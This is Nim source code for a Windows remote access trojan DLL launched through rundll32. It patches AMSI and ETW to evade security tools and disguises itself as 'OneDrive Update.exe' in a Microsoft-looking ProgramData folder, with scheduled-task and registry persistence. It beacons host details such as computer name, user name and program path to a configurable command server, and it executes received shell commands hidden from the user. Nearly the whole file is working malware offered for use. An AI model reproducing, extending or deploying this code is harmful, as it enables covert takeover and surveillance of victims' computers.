import winim/lean
import std/strutils
import amsi_patch
import etw_patch

# Link with Ws2_32.lib
{.passL: "Ws2_32.lib".}

# --- Configuration Structs (Must match C++ Config.h) ---

const
    MAX_PATH_LEN = 260
    DEFAULT_PORT = "8080"
    DEFAULT_IP = "127.0.0.1"

type
    CONNECT_ADDRESS* {.packed.} = object
        szFlag*: array[32, char]        # "FRMD26_CONFIG"
        szServerIP*: array[100, char]
        szPort*: array[8, char]
        iType*: int32
        bEncrypt*: int32
        szBuildDate*: array[12, char]
        iMultiOpen*: int32
        iStartup*: int32
        iHeaderEnc*: int32
        protoType*: char
        runningType*: char
        payloadType*: char
        szGroupName*: array[24, char]
        runasAdmin*: char
        szInstallDir*: array[MAX_PATH_LEN, char]
        szInstallName*: array[MAX_PATH_LEN, char]
        szDownloadUrl*: array[512, char]
        taskStartup*: char
        serviceStartup*: char
        registryStartup*: char
        iPumpSize*: int32
        szReserved*: array[3, char]
        clientID*: uint64
        parentHwnd*: uint64
        superAdmin*: uint64
        pwdHash*: array[64, char]

    PkgHeader* {.packed.} = object
        flag*: array[8, char]       # "FRMD26?" + \0
        totalLen*: int32
        originLen*: int32

    CommandPkg* {.packed.} = object
        cmd*: uint32
        arg1*: uint32
        arg2*: uint32
        data*: array[1, char] # Dummy size, will be cast

    ClientInfo* {.packed.} = object
        osVersion*: array[64, char]
        computerName*: array[64, char]
        userName*: array[64, char]
        cpuInfo*: array[128, char]
        lanAddr*: array[64, char]
        publicAddr*: array[64, char]
        activeWindow*: array[256, char]
        installTime*: array[64, char]
        uptime*: array[64, char]
        version*: array[32, char]
        programPath*: array[MAX_PATH_LEN, char]
        processID*: uint32
        clientUniqueId*: uint64
        rtt*: int32
        is64Bit*: int32
        isAdmin*: int32
        hasCamera*: int32
        hasTelegram*: int32
        cpuLoad*: float32
        memUsage*: uint64
        diskUsage*: float32
        clientType*: int32
        remark*: array[256, Utf16Char] # wchar_t in C++
        group*: array[128, Utf16Char]  # wchar_t in C++

# --- Helper Functions ---

# Compile-time helper to convert string to char array
proc toCharArray[N: static[int]](s: string): array[N, char] =
    for i in 0 ..< min(s.len, N):
        result[i] = s[i]

proc toWCharArray[N: static[int]](s: string, arr: var array[N, Utf16Char]) =
    zeroMem(addr arr[0], N * 2)
    let ws = newWideCString(s)
    let len = min(ws.len, N - 1)
    if len > 0:
        copyMem(addr arr[0], ws[0].unsafeAddr, len * 2)

proc wideToUtf8(wstr: WideCString): string =
    if wstr == nil: return ""
    $wstr

# Global Configuration Instance (Static Initialization for Builder Patching)
# Exported so it is not optimized out and can be found in .data section
var g_ServerConfig* {.exportc, used.} = CONNECT_ADDRESS(
    szFlag: toCharArray[32]("FRMD26_CONFIG"),
    szServerIP: toCharArray[100](DEFAULT_IP),
    szPort: toCharArray[8](DEFAULT_PORT),
    iType: 0,
    bEncrypt: 0,
    szBuildDate: toCharArray[12]("2026-02-10"),
    iMultiOpen: 1,
    iStartup: 1,
    iHeaderEnc: 1,
    protoType: 0.char,
    runningType: 0.char,
    payloadType: 0.char,
    szGroupName: toCharArray[24]("default"),
    runasAdmin: 1.char,
    szInstallDir: toCharArray[MAX_PATH_LEN](r"C:\ProgramData\Microsoft\OneDriveUpdate"),
    szInstallName: toCharArray[MAX_PATH_LEN]("OneDrive Update.exe"),
    szDownloadUrl: toCharArray[512](""),
    taskStartup: 1.char,
    serviceStartup: 0.char,
    registryStartup: 1.char,
    iPumpSize: 0,
    clientID: 0,
    parentHwnd: 0,
    superAdmin: 0
)

proc getSystemInfo(): ClientInfo =
    var info: ClientInfo
    zeroMem(addr info, sizeof(info))

    # OS Version
    var osName = toCharArray[64]("Windows 10/11")
    info.osVersion = osName

    # Computer Name
    var buf = newString(MAX_PATH_LEN)
    var size = DWORD(MAX_PATH_LEN)
    var wBufObj = newWideCString(newString(MAX_PATH_LEN))
    var wBuf = cast[LPWSTR](cast[pointer](toWideCString(wBufObj)))
    GetComputerNameW(wBuf, addr size)
    var compNameStr = wideToUtf8(toWideCString(wBufObj))
    var compName = toCharArray[64](compNameStr)
    info.computerName = compName

    # User Name
    size = DWORD(MAX_PATH_LEN)
    wBufObj = newWideCString(newString(MAX_PATH_LEN))
    wBuf = cast[LPWSTR](cast[pointer](toWideCString(wBufObj)))
    GetUserNameW(wBuf, addr size)
    var userNameStr = wideToUtf8(toWideCString(wBufObj))
    var userName = toCharArray[64](userNameStr)
    info.userName = userName

    # Process ID
    info.processID = uint32(GetCurrentProcessId())

    # Is 64 Bit
    var isWow64: BOOL
    IsWow64Process(GetCurrentProcess(), addr isWow64)
    if sizeof(pointer) == 8:
        info.is64Bit = 1
    elif isWow64 != 0:
        info.is64Bit = 0
    else:
        info.is64Bit = 0

    # Program Path
    GetModuleFileNameA(0, buf.cstring, MAX_PATH_LEN)
    var progPath = toCharArray[MAX_PATH_LEN]($buf.cstring)
    info.programPath = progPath

    # Memory Usage
    var statex: MEMORYSTATUSEX
    statex.dwLength = sizeof(statex).DWORD
    GlobalMemoryStatusEx(addr statex)
    info.memUsage = uint64(statex.ullTotalPhys - statex.ullAvailPhys)

    # Group
    let groupStr = $cast[cstring](addr g_ServerConfig.szGroupName[0])
    toWCharArray(groupStr, info.group)

    return info

# --- Networking ---

proc heartbeatThread(lpParam: LPVOID): DWORD {.stdcall.} =
    let sock = cast[SOCKET](lpParam)
    while true:
        Sleep(5000)
        # Check if socket is still valid? (Hard to know without mutex/atomic, but if main thread closes it, send will fail)
        
        var hbInfo = getSystemInfo()
        var respLen = sizeof(CommandPkg) - 1 + sizeof(ClientInfo)
        var respBuf = newSeq[byte](respLen)
        var pResp = cast[ptr CommandPkg](addr respBuf[0])
        pResp.cmd = 1 # CMD_HEARTBEAT
        pResp.arg1 = sizeof(ClientInfo).uint32
        copyMem(addr pResp.data[0], addr hbInfo, sizeof(hbInfo))
        
        # We need to manually construct the packet because sendPkg is not thread-safe if it uses globals (it doesn't seem to)
        # But send() on same socket from multiple threads is generally safe on Windows (interleaved bytes is the risk)
        # Since we send full packet in one go (mostly), it should be okay-ish.
        # Ideally we should use a mutex.
        
        var header: PkgHeader
        header.flag = toCharArray[8]("FRMD26?")
        header.originLen = int32(respLen)
        header.totalLen = int32(sizeof(PkgHeader) + respLen)
        
        # Send Header
        if send(sock, cast[ptr char](addr header), int32(sizeof(header)), 0) <= 0:
            break
            
        # Send Body
        if send(sock, cast[ptr char](addr respBuf[0]), int32(respLen), 0) <= 0:
            break
            
    return 0

proc sendPkg(s: SOCKET, cmd: uint32, data: pointer, len: int) =
    var header: PkgHeader
    header.flag = toCharArray[8]("FRMD26?")
    header.originLen = int32(len)
    header.totalLen = int32(sizeof(PkgHeader) + len)
    
    send(s, cast[ptr char](addr header), int32(sizeof(header)), 0)
    if len > 0:
        send(s, cast[ptr char](data), int32(len), 0)

proc run_client_loop() =
    var wsa: WSADATA
    if WSAStartup(0x0202, addr wsa) != 0:
        return

    while true:
        let ip = $cast[cstring](addr g_ServerConfig.szServerIP[0])
        let portStr = $cast[cstring](addr g_ServerConfig.szPort[0])
        let port = parseInt(portStr).uint16

        let sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
        if sock != INVALID_SOCKET:
            var addr_in: sockaddr_in
            addr_in.sin_family = AF_INET
            addr_in.sin_port = htons(port)
            addr_in.sin_addr.S_addr = int32(inet_addr(ip.cstring))

            if connect(sock, cast[ptr sockaddr](addr addr_in), sizeof(addr_in).int32) == 0:
                # Connected
                # Send Initial Info
                var info = getSystemInfo()
                sendPkg(sock, 0, addr info, sizeof(info))

                # Heartbeat Thread
                var hThread: HANDLE = 0
                var threadId: DWORD = 0
                
                # Using CreateThread to avoid GC issues in Nim threads if not initialized properly
                # We pass the socket as parameter
                hThread = CreateThread(nil, 0, cast[LPTHREAD_START_ROUTINE](heartbeatThread), cast[LPVOID](sock), 0, addr threadId)

                while true:
                    # Receive Header
                    var header: PkgHeader
                    let ret = recv(sock, cast[ptr char](addr header), int32(sizeof(header)), 0)
                    if ret <= 0: break
                    
                    if cast[cstring](addr header.flag[0]) != "FRMD26?":
                        break
                        
                    # Receive Body
                    let bodyLen = header.originLen
                    if bodyLen > 0:
                        var body = newSeq[byte](bodyLen)
                        let ret2 = recv(sock, cast[ptr char](addr body[0]), bodyLen, 0)
                        if ret2 <= 0: break
                        
                        # Process Command
                        let cmdPkg = cast[ptr CommandPkg](addr body[0])
                        case cmdPkg.cmd:
                        of 1: # CMD_HEARTBEAT
                            var hbInfo = getSystemInfo()
                            var respLen = sizeof(CommandPkg) - 1 + sizeof(ClientInfo)
                            var respBuf = newSeq[byte](respLen)
                            var pResp = cast[ptr CommandPkg](addr respBuf[0])
                            pResp.cmd = 1
                            pResp.arg1 = sizeof(ClientInfo).uint32
                            copyMem(addr pResp.data[0], addr hbInfo, sizeof(hbInfo))
                            
                            sendPkg(sock, 1, addr respBuf[0], respLen)
                            
                        of 999: # CMD_EXIT
                            closesocket(sock)
                            ExitProcess(0)
                        
                        of 62: # CMD_SHELL_EXEC
                            let cmdLen = header.originLen - (sizeof(CommandPkg) - 1)
                            if cmdLen > 0:
                                var cmdStr = newString(cmdLen)
                                copyMem(addr cmdStr[0], addr cmdPkg.data[0], cmdLen)
                                WinExec(cmdStr.cstring, SW_HIDE)
                                
                        else:
                            discard

            closesocket(sock)
        
        Sleep(5000)

# --- Exports ---

proc Run*(hwnd: HWND, hinst: HINSTANCE, lpszCmdLine: LPSTR, nCmdShow: int) {.stdcall, exportc: "Run", dynlib.} =
    # Main Entry Point for rundll32
    
    # 1. Evasion
    discard patchAmsi()
    discard patchEtw()
    
    # 2. Run Client Loop
    run_client_loop()

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall, exportc: "DllMain", dynlib.} =
    return TRUE
